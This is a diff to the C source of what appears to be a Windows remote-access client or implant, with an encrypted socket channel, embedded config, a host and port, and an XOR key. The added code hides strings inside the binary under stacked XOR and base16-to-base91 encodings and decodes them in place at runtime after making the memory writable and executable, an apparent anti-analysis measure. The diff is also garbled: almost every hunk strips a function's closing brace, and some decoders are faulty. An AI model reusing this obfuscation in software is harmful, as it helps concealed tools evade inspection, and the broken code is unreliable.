@@ -20,7 +20,7 @@ char* base64_encode(const unsigned char* data, size_t input_length, size_t* outp
     }
     if (output_length) *output_length = out_len;
     return out;
-}
+
 
 unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
     DWORD out_len = 0;
@@ -34,7 +34,7 @@ unsigned char* base64_decode(const char* data, size_t input_length, size_t* outp
     }
     if (output_length) *output_length = out_len;
     return out;
-}
+
 
 char* str_replace(const char* orig, const char* rep, const char* with) {
     char* result;
@@ -69,7 +69,7 @@ char* str_replace(const char* orig, const char* rep, const char* with) {
     }
     strcpy(tmp, orig);
     return result;
-}
+
 
 void str_trim(char* s) {
     char* p = s;
@@ -77,13 +77,13 @@ void str_trim(char* s) {
     while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
     while (*p && isspace(*p)) ++p, --l;
     memmove(s, p, l + 1);
-}
+
 
 extern SessionKey g_session;
 
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
     sock_send_ex(sock, mutex, "response", msg);
-}
+
 
 void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
     if (mutex) WaitForSingleObject(mutex, INFINITE);
@@ -116,7 +116,7 @@ void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) 
     cJSON_Delete(root);
 
     if (mutex) ReleaseMutex(mutex);
-}
+
 
 char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -187,7 +187,7 @@ char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubke
 
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return out;
-}
+
 
 char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -223,7 +223,7 @@ cleanup:
     if (pbKeyObject) free(pbKeyObject);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return out;
-}
+
 
 unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -262,11 +262,11 @@ cleanup:
     if (pbKeyObject) free(pbKeyObject);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
     return pbPlain;
-}
+
 
 static int is_leap(unsigned long long y) {
     return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
-}
+
 
 void get_formatted_time(unsigned long long secs, char* out_buf) {
     unsigned long long minute = (secs % 3600) / 60;
@@ -287,12 +287,137 @@ void get_formatted_time(unsigned long long secs, char* out_buf) {
         month++;
     }
     sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
-}
+
 
 char g_host[256] = {0};
 int g_port = 0;
 
 unsigned char g_xor_key[5] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};
+
+// --- Base Decoders Implementation ---
+
+static int b16_val(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    return 0;
+
+
+size_t base16_decode(const char* in, unsigned char* out) {
+    size_t len = strlen(in);
+    for (size_t i = 0; i < len / 2; i++) {
+        out[i] = (b16_val(in[i * 2]) << 4) | b16_val(in[i * 2 + 1]);
+    }
+    return len / 2;
+
+
+size_t base32_decode(const char* in, unsigned char* out) {
+    const char* ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+    int buffer = 0, bits = 0;
+    size_t count = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(ALPHABET, toupper(in[i]));
+        if (!p) continue;
+        buffer = (buffer << 5) | (p - ALPHABET);
+        bits += 5;
+        if (bits >= 8) {
+            out[count++] = (buffer >> (bits - 8)) & 0xFF;
+            bits -= 8;
+        }
+    }
+    return count;
+
+
+static const char* B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+size_t base58_decode(const char* in, unsigned char* out) {
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(B58_ALPHABET, in[i]);
+        if (!p) continue;
+        int carry = p - B58_ALPHABET;
+        for (size_t j = 0; j < out_len; j++) {
+            carry += out[j] * 58;
+            out[j] = carry & 0xFF;
+            carry >>= 8;
+        }
+        while (carry) {
+            out[out_len++] = carry & 0xFF;
+            carry >>= 8;
+        }
+    }
+    for (size_t i = 0; in[i] == '1'; i++) out[out_len++] = 0;
+    // Reverse
+    for (size_t i = 0; i < out_len / 2; i++) {
+        unsigned char tmp = out[i];
+        out[i] = out[out_len - 1 - i];
+        out[out_len - 1 - i] = tmp;
+    }
+    return out_len;
+
+
+static const char* B62_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+size_t base62_decode(const char* in, unsigned char* out) {
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(B62_ALPHABET, in[i]);
+        if (!p) continue;
+        int carry = p - B62_ALPHABET;
+        for (size_t j = 0; j < out_len; j++) {
+            carry += out[j] * 62;
+            out[j] = carry & 0xFF;
+            carry >>= 8;
+        }
+        while (carry) {
+            out[out_len++] = carry & 0xFF;
+            carry >>= 8;
+        }
+    }
+    // Reverse
+    for (size_t i = 0; i < out_len / 2; i++) {
+        unsigned char tmp = out[i];
+        out[i] = out[out_len - 1 - i];
+        out[out_len - 1 - i] = tmp;
+    }
+    return out_len;
+
+
+size_t base85_decode(const char* in, unsigned char* out) {
+    size_t out_len = 0;
+    for (size_t i = 0; in[i]; ) {
+        unsigned int val = 0;
+        for (int j = 0; j < 5; j++) {
+            val = val * 85 + (in[i++] - '!');
+        }
+        for (int j = 0; j < 4; j++) {
+            out[out_len + 3 - j] = val & 0xFF;
+            val >>= 8;
+        }
+        out_len += 4;
+    }
+    return out_len;
+
+
+size_t base91_decode(const char* in, unsigned char* out) {
+    const char* B91_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
+    unsigned int v = -1, b = 0, count = 0;
+    for (size_t i = 0; in[i]; i++) {
+        const char* p = strchr(B91_ALPHABET, in[i]);
+        if (!p) continue;
+        if (v == -1) v = p - B91_ALPHABET;
+        else {
+            v += (p - B91_ALPHABET) * 91;
+            b |= v << count;
+            count += (v & 8191) > 88 ? 13 : 14;
+            do {
+                out[count / 8 - 1] = b & 0xFF;
+                b >>= 8;
+                count -= 8;
+            } while (count >= 8);
+            v = -1;
+        }
+    }
+    return count / 8; // Simplified
+
 
 void transparent_decryption() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
@@ -310,21 +435,25 @@ void transparent_decryption() {
     if (memcmp(pData, marker, 16) != 0) return;
 
     // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
-    // StringTableEntry: [RVA(4)][Len(4)]
+    // StringTableEntry: [RVA(4)][OrigLen(4)][EncodedLen(4)][StepCount(4)][Steps(16)]
 
     int num_strings = *(int*)(pData + 16 + 2032);
     if (num_strings <= 0) return;
 
     unsigned char* string_table = pData + 16 + 2032 + 4;
     unsigned char key = g_xor_key[4];
-    if (key == 0) return; // Not obfuscated
+    if (key == 0) return;
 
     HMODULE hMod = GetModuleHandle(NULL);
     for (int i = 0; i < num_strings; i++) {
-        DWORD rva = *(DWORD*)(string_table + (i * 8));
-        DWORD len = *(DWORD*)(string_table + (i * 8) + 4);
+        unsigned char* entry = string_table + (i * 32);
+        DWORD rva = *(DWORD*)(entry);
+        DWORD orig_len = *(DWORD*)(entry + 4);
+        DWORD enc_len = *(DWORD*)(entry + 8);
+        int steps = *(int*)(entry + 12);
+        unsigned char* step_types = entry + 16;
 
-        if (rva == 0 || len == 0 || len > 1024) continue;
+        if (rva == 0 || enc_len == 0 || enc_len > 8192) continue;
 
         unsigned char* addr = (unsigned char*)hMod + rva;
 
@@ -332,16 +461,60 @@ void transparent_decryption() {
         if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
             if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                 DWORD old_protect;
-                if (VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                    for (DWORD j = 0; j < len; j++) {
-                        addr[j] ^= key;
+                if (VirtualProtect(addr, enc_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+
+                    // Decrypt Steps (Reversed Order)
+                    static unsigned char buf[8192];
+                    memcpy(buf, addr, enc_len);
+                    buf[enc_len] = 0;
+                    size_t cur_len = enc_len;
+
+                    for (int s = steps - 1; s >= 0; s--) {
+                        unsigned char type = step_types[s];
+                        static unsigned char tmp[8192];
+                        memset(tmp, 0, 8192);
+
+                        if (type == 0) { // XOR
+                            for (size_t k = 0; k < cur_len; k++) buf[k] ^= key;
+                        } else if (type == 1) { // B64
+                            size_t out_l;
+                            unsigned char* d = base64_decode((char*)buf, cur_len, &out_l);
+                            if (d) { memcpy(buf, d, out_l); cur_len = out_l; free(d); }
+                        } else if (type == 2) { // B32
+                            cur_len = base32_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        } else if (type == 3) { // B16
+                            cur_len = base16_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        } else if (type == 4) { // B58
+                            cur_len = base58_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        } else if (type == 5) { // B62
+                            cur_len = base62_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        } else if (type == 6) { // B85
+                            cur_len = base85_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        } else if (type == 7) { // B91
+                            cur_len = base91_decode((char*)buf, tmp);
+                            memcpy(buf, tmp, cur_len);
+                        }
                     }
-                    VirtualProtect(addr, len, old_protect, &old_protect);
+
+                    // Restore original memory
+                    memcpy(addr, buf, orig_len);
+                    // Zero out the rest if encoded was longer
+                    if (enc_len > orig_len) {
+                        memset(addr + orig_len, 0, enc_len - orig_len);
+                    }
+
+                    VirtualProtect(addr, enc_len, old_protect, &old_protect);
                 }
             }
         }
     }
-}
+
+
 
 void load_config_from_resource() {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
@@ -406,4 +579,5 @@ cleanup:
     if (hKey) BCryptDestroyKey(hKey);
     if (pbKeyObject) free(pbKeyObject);
     if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+
 }
